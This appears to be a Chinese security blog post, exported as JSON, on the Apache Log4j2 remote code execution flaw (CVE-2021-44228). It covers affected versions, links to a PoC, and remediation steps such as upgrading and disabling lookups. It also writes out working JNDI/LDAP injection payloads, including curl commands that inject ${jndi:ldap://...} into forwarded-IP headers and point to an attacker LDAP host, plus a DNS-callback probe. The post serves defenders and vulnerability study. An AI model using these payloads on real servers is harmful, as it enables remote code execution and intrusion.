{"title":"Apache Log4j2 日志记录服务之远程代码执行漏洞实践与防护","slug":"网安大类/Vulnerable/Appllication/开发框架/Apache/Log4j2日志记录服务之远程代码执行漏洞(CVE-2021-44228)","date":"2022-01-17T05:36:30.000Z","updated":"2022-03-30T05:11:18.043Z","url":"2022/1-17-634.html","path":"api/articles/2022/1-17-634.html.json","covers":null,"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h2 id=\"0x00-快速介绍\"><a href=\"#0x00-快速介绍\" class=\"headerlink\" title=\"0x00 快速介绍\"></a>0x00 快速介绍</h2><p>Apache Log4j2 日志记录服务之远程代码执行漏洞实践与防护</p>\n<p>背景介绍: Apache Log4j2 是一个开源的Java日志框架，被广泛地应用在中间件、开发框架与Web应用中。<br>Tips: Log4j2是Log4j的升级版, 对其前身Log4j 1.x进行了重大改进, 并提供了Logback中可用的许多改进，同时修复了Logback架构中的一些固有问题。</p>\n<p>Apache 日志记录服务官网: <a href=\"https://logging.apache.org/\" target=\"_blank\" rel=\"noopener\">https://logging.apache.org/</a><br>Log4j2 项目官网: <a href=\"https://logging.apache.org/log4j/2.x/index.html\" target=\"_blank\" rel=\"noopener\">https://logging.apache.org/log4j/2.x/index.html</a></p>\n<p><strong>漏洞时间:</strong><br><strong>影响版本:</strong> Apache Log4j 2.x &lt;= 2.14.1</p>\n<p><strong>POC &amp; Exploit:</strong><br><a href=\"https://github.com/tangxiaofeng7/apache-log4j-poc\" target=\"_blank\" rel=\"noopener\">https://github.com/tangxiaofeng7/apache-log4j-poc</a></p>\n<p>简单分析+审计：</p>\n<p><a href=\"https://bbs.ichunqiu.com/thread-62322-1-1.html\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/thread-62322-1-1.html</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/-_e_Jk_6F5LZ9qOuheTQxA\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/-_e_Jk_6F5LZ9qOuheTQxA</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA</a></p>\n<p>修复建议：</p>\n<p>安全建议</p>\n<ol>\n<li><p>升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本，地址：<a href=\"https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2\" target=\"_blank\" rel=\"noopener\">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>\n</li>\n<li><p>升级已知受影响的应用及组件，如srping-boot-strater-log4j2/Apache Solr/Apache Flink/Apache Druid</p>\n</li>\n<li><p>jvm参数 -Dlog4j2.formatMsgNoLookups=true</p>\n</li>\n<li><p>log4j2.formatMsgNoLookups=True</p>\n</li>\n<li><p>系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true</p>\n</li>\n<li><p>禁止使用log4j的服务器外连出网</p>\n</li>\n<li><p>使用高版本jdk（如jdk11.0.1、8u191、7u201、6u211或更高版本），因为高版本jdk默认无法利用jndi注入</p>\n</li>\n</ol>\n<p>${jndi:ldap://10.20.172.103:8088/Exploit}</p>\n<p>curl <a href=\"http://192.168.12.215:32086/kaptcha?_=1639371809353\" target=\"_blank\" rel=\"noopener\">http://192.168.12.215:32086/kaptcha?_=1639371809353</a> -H ‘X-Real-IP: ${jndi:ldap://10.20.172.103:8088/Exploit}’ </p>\n<p>-H ‘X_FORWARDED_FOR: ${jndi:ldap://10.20.172.103:8088/Exploit}’</p>\n<p>curl <a href=\"http://192.168.12.215:32086/kaptcha?_=1639371809353\" target=\"_blank\" rel=\"noopener\">http://192.168.12.215:32086/kaptcha?_=1639371809353</a> -H ‘X-Forwarded-For: ${jndi:ldap://10.20.172.103:8088/Exploit}’<br>curl <a href=\"http://192.168.12.215:32086/kaptcha?_=1639371809353\" target=\"_blank\" rel=\"noopener\">http://192.168.12.215:32086/kaptcha?_=1639371809353</a> -H ‘Proxy-Client-IP: ${jndi:ldap://10.20.172.103:8088/Exploit}’<br>curl <a href=\"http://192.168.12.215:32086/kaptcha?_=1639371809353\" target=\"_blank\" rel=\"noopener\">http://192.168.12.215:32086/kaptcha?_=1639371809353</a> -H ‘WL-Proxy-Client-IP: ${jndi:ldap://10.20.172.103:8080/Exploit}’<br>curl <a href=\"http://192.168.12.215:32086/kaptcha?_=1639371809353\" target=\"_blank\" rel=\"noopener\">http://192.168.12.215:32086/kaptcha?_=1639371809353</a> -H ‘HTTP_CLIENT_IP: ${jndi:ldap://10.20.172.103:8088/Exploit}’<br>curl <a href=\"http://192.168.12.215:32086/kaptcha?_=1639371809353\" target=\"_blank\" rel=\"noopener\">http://192.168.12.215:32086/kaptcha?_=1639371809353</a> -H ‘HTTP_X_FORWARDED_FOR: ${jndi:ldap://10.20.172.103:8088/Exploit}’</p>\n<p>X-Forwarded-For: ${jndi:ldap://10.20.172.103:8088/badClassName}<br>Proxy-Client-IP: ${jndi:ldap://10.20.172.103:8088/badClassName}<br>WL-Proxy-Client-IP: ${jndi:ldap://10.20.172.103:8088/badClassName}<br>HTTP_CLIENT_IP: ${jndi:ldap://10.20.172.103:8088/badClassName}<br>HTTP_X_FORWARDED_FOR: ${jndi:ldap://10.20.172.103:8088/badClassName}</p>\n<p>${jndi:ldap://37bo7s.ceye.io/a}</p>\n<pre><code>String ip=&quot;&quot;;\nString ip1 = request.getHeader(&quot;X_FORWARDED_FOR&quot;);\nString ip2 = request.getHeader(&quot;X-Forwarded-For&quot;);\nString ip3 = request.getHeader(&quot;Proxy-Client-IP&quot;);\nString ip4 = request.getHeader(&quot;WL-Proxy-Client-IP&quot;);\nString ip5 = request.getHeader(&quot;HTTP_CLIENT_IP&quot;);\nString ip6 = request.getHeader(&quot;HTTP_X_FORWARDED_FOR&quot;);\n</code></pre>","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。[TOC]","categories":[{"name":"Apache","path":"api/categories/Apache.json"},{"name":"漏洞分析","path":"api/categories/漏洞分析.json"}],"tags":[{"name":"Log4j2","path":"api/tags/Log4j2.json"}]}